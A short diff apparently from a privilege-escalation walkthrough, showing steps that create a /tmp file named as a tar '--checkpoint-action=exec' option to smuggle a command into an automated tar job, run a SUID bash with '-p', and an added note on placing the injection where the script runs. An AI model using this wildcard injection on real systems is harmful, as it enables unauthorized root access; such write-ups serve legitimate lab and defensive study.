@@ -27,3 +27,5 @@
 #### 4) touch /tmp/--checkpoint-action=exec=sh\runme.sh
 
 #### 5) /tmp/bash -p
+
+### Note: Do the injection in the correct directory the automated script goes to so that it can actually run the injected commands via tar
